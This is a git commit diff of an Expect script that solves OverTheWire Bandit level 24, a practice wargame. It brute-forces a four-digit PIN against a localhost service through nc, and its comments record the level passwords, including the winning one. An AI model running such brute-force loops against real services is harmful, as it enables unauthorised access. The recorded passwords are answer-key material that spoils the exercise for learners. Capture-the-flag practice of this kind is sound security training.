77cf012141b5f879d993e36e82c4dc11da3678b0
Chris Pritchard <chrispritchard.nz@gmail.com>
2019-06-05 21:52:43 +1200

    finished bandit 24

--- Bandit/bandit24.sh
+++ Bandit/bandit24.sh
@@ -7,18 +7,16 @@ expect "*\$ "
 
 send "nc localhost 30002\r"
 
-for {set i 0} {$i < 10000} {incr i 1} {
+# the connection gets reset sometimes. so jump to last reset (6900 for me)
+set startLoop 6900
+set endLoop 10000
+# note it succeeded at 8530 with uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+# this took several hours - a bit of psychology would have suggested maybe count back
+
+for {set i $startLoop} {$i < $endLoop} {incr i 1} {
     set pin "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ [format "%04d" $i]\r"
     send "$pin"
     expect "Wrong! Please enter the correct pincode. Try again."
 }
-
-# send "{ for i in $(seq -f "%04g" 0 9999); do echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i; done; } | nc localhost 30002 > /tmp/brute.txt\r"
-# expect "*\$ "
-
-# send "cat /tmp/brute.txt | uniq\r"
-# expect "*\$ "
-
-# send "exit\r"
 
 interact
